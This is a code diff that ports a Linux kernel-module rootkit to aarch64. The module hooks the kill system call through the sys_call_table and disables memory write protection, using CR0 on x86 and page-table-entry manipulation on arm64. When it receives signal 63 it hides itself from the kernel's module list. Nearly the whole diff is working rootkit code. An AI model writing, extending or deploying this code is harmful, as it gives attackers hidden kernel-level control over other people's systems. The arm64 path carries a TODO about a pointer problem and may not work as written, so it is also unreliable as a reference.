@@ -4,9 +4,15 @@
 #include <linux/kprobes.h>
 #include <linux/kallsyms.h>
 #include <asm/ptrace.h>
-#include <asm/paravirt.h>
 #include <linux/unistd.h>
 #include <linux/list.h>
+#include <linux/errno.h>
+
+#ifdef __x86_64__
+#include <asm/paravirt.h>
+#elif __aarch64__
+#include <asm/pgtable.h>
+#endif
 
 /*
  * Informational macros about this module
@@ -19,6 +25,11 @@ MODULE_VERSION("0.1.0");
 
 /* Pointer to the memory address of the system call table */
 static unsigned long *__sys_call_table = NULL;
+
+#ifdef __aarch64__
+/* Pointer to the system call table page table entry */
+static pte_t *__sys_call_table_pte = NULL;
+#endif
 
 /*
  * kprobe struct to find kallsyms_lookup_name function
@@ -45,6 +56,7 @@ static pt_regs_t orig_kill = NULL;
 static struct list_head *module_previous;
 static int module_hidden = 0;
 
+#ifdef __x86_64__
 /*
  * Modifies the Intel/AMD CR0 register state. This function is necessary
  * because write_cr0 is no longer effective.
@@ -71,6 +83,56 @@ static void protect_memory(void)
 {
     write_cr0_forced(read_cr0() | 0x00010000);
 }
+#elif __aarch64__
+/* Unset the PTE write protect bit */
+static void unprotect_memory(void)
+{
+    *__sys_call_table_pte = pte_mkwrite(pte_mkdirty(*__sys_call_table_pte), NULL);
+    *__sys_call_table_pte = clear_pte_bit(*__sys_call_table_pte, __pgprot((_AT(pteval_t, 1) << 7)));
+}
+
+/* Set the PTE write protect bit */
+static void protect_memory(void)
+{
+    pte_wrprotect(*__sys_call_table_pte);
+}
+
+/*
+ * Obtain a page from virtual memory.
+ *
+ * @param addr memory address
+ * @return pointer to page table entry (PTE)
+ */
+static pte_t *page_from_virt(unsigned long addr) {
+    pgd_t *pgd;
+    pud_t *pud;
+    pmd_t *pmd;
+    pte_t *ptep;
+
+    struct mm_struct *init_mm_ptr = (struct mm_struct *)kallsyms_lookup_name_p("init_mm");
+    pgd = pgd_offset(init_mm_ptr, addr);
+    if (pgd_none(*pgd) || pgd_bad(*pgd)) {
+        return NULL;
+    }
+
+    pud = pud_offset((p4d_t *)pgd, addr);
+    if (pud_none(*pud) || pud_bad(*pud)) {
+        return NULL;
+    }
+
+    pmd = pmd_offset(pud, addr);
+    if (pmd_none(*pmd) || pmd_bad(*pmd)) {
+        return NULL;
+    }
+
+    ptep = pte_offset_kernel(pmd, addr);
+    if (!ptep) {
+        return NULL;
+    }
+
+    return ptep;
+}
+#endif
 
 /*
  * Wrapper function that is called whenever the `kill` system call is executed.
@@ -85,7 +147,11 @@ static void protect_memory(void)
 */
 static asmlinkage long kill_hook(const struct pt_regs *regs)
 {
+#ifdef __x86_64__
     int sig = regs->si;
+#elif __aarch64__
+    int sig = regs->regs[1];
+#endif
     if (sig == 63) {
         if (!module_hidden) {
             module_previous = THIS_MODULE->list.prev;
@@ -151,10 +217,19 @@ static int __init module_start(void)
     /* Retrieves the memory address of the system call table */
     kallsyms_lookup_name_p = (kallsyms_lookup_name_p_t)kp_kallsyms_func.addr;
     __sys_call_table = (unsigned long *)kallsyms_lookup_name_p("sys_call_table");
+
+    /* Frees up any resources used when registering the kprobe */
+    unregister_kprobe(&kp_kallsyms_func);
+
     if (!__sys_call_table) {
         pr_info("kallsyms_lookup_name could not find sys_call_table");
-        return 1;
+        return -ENOENT;
     }
+
+#ifdef __aarch64__
+    /* TODO: weird aarch64 issue with pointer dereferencing not working */
+    __sys_call_table_pte = page_from_virt(*__sys_call_table);
+#endif
 
     overwrite_sys_call_table();
 
@@ -167,10 +242,6 @@ static void __exit module_end(void)
 {
     restore_sys_call_table();
 
-    /* Frees up any resources used when registering the kprobe */
-    unregister_kprobe(&kp_kallsyms_func);
-
-    /* Shorthand for printk(KERN_INFO ...); */
     pr_info("Module unloaded.\n");
 }
 
